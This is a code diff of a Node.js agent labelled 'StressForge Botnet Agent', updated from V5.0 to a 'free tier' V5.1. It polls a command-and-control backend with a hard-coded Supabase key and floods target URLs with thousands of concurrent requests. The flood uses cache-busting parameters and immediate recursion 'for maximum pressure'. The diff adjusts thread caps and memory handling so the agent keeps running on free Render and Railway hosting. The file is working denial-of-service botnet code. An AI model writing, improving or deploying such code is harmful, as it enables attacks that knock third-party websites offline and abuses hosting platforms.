@@ -1,10 +1,9 @@
 /**
- * STRESSFORGE BOTNET AGENT V5.0 (EXTREME)
- * - Feature: Zero-Latency Networking (Nagle Disabled)
- * - Feature: Aggressive Cache Busting (Chaos Mode)
+ * STRESSFORGE BOTNET AGENT V5.1 (FREE TIER EDITION)
+ * - Feature: Memory Safety Governor (Prevents OOM Kills)
+ * - Feature: Zero-Latency Networking
  * - Feature: Auto-Following Redirects
- * - Capacity: Max 5000 Threads per Node
- * - Host: Compatible with Render & Railway
+ * - Capacity: Max 2500 Threads (Safe for 512MB RAM)
  */
 const https = require('https');
 const http = require('http');
@@ -12,11 +11,12 @@ const http = require('http');
 // --- CONFIG ---
 const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
-const MAX_SAFE_CONCURRENCY = 5000;
+// Reduced to prevent "Killed" errors on Render Free Tier
+const MAX_SAFE_CONCURRENCY = 2500; 
 
 // --- KEEPALIVE SERVER (REQUIRED FOR RAILWAY/RENDER) ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V5.0 Active'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V5.1 Active'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: ROBUST REQUEST ---
@@ -54,7 +54,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V5.0 (EXTREME). Polling C2...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V5.1 (FREE TIER OPTIMIZED). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -62,9 +62,9 @@ let activeLoop = null;
 const startAttack = (job) => {
     if (activeJob) return;
     
-    // SAFETY GOVERNOR (Bumped to 5000 for V5.0)
+    // SAFETY GOVERNOR
     if (job.concurrency > MAX_SAFE_CONCURRENCY) {
-        console.log(`\x1b[31m[SAFETY] Capping threads from ${job.concurrency} to ${MAX_SAFE_CONCURRENCY} (RAM Limit)\x1b[0m`);
+        console.log(`\x1b[31m[SAFETY] Capping threads from ${job.concurrency} to ${MAX_SAFE_CONCURRENCY} (Free Tier Limit)\x1b[0m`);
         job.concurrency = MAX_SAFE_CONCURRENCY;
     }
 
@@ -90,7 +90,7 @@ const startAttack = (job) => {
     const agent = new https.Agent({ 
         keepAlive: true, 
         keepAliveMsecs: 1000, 
-        maxSockets: Infinity, // Unlimited socket pooling
+        maxSockets: Infinity,
         scheduling: 'fifo'
     });
     
@@ -103,7 +103,7 @@ const startAttack = (job) => {
         agent,
         method: job.method || 'GET',
         headers: headers,
-        timeout: 5000 // Fast timeout to free resources
+        timeout: 5000 
     };
     reqOptions.headers['Host'] = targetUrl.host;
     reqOptions.headers['Cache-Control'] = 'no-cache, no-store';
@@ -111,7 +111,7 @@ const startAttack = (job) => {
     const performRequest = (currentUrl, currentOptions, onFinish) => {
         const lib = currentUrl.protocol === 'https:' ? https : http;
         
-        // CHAOS VORTEX: Aggressive Cache Busting
+        // CHAOS VORTEX
         const vortexUrl = new URL(currentUrl.href);
         const separator = vortexUrl.search ? '&' : '?';
         vortexUrl.search += `${separator}_vortex=${Math.random().toString(36).substring(2)}`;
@@ -129,9 +129,8 @@ const startAttack = (job) => {
             onFinish(res, null);
         });
 
-        // SOCKET OPTIMIZATION: ZERO LATENCY
         req.on('socket', (socket) => {
-            socket.setNoDelay(true); // Disable Nagle's Algorithm for instant send
+            socket.setNoDelay(true); 
         });
 
         req.on('error', (e) => onFinish(null, e));
@@ -153,12 +152,10 @@ const startAttack = (job) => {
              else jobFailed++;
              totalRequests++;
              
-             // Immediate recurse for maximum pressure
              if (running) setImmediate(flood); 
         });
     };
 
-    // Ignite Swarm
     for(let i=0; i<job.concurrency; i++) flood();
 
     activeLoop = setInterval(async () => {
@@ -166,6 +163,12 @@ const startAttack = (job) => {
         const rps = Math.floor(totalRequests / elapsed) || 0;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
+        // Memory Monitor
+        const used = process.memoryUsage().heapUsed / 1024 / 1024;
+        if (used > 450) {
+             if (global.gc) { global.gc(); }
+        }
+
         try {
              await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { 
                  current_rps: rps,
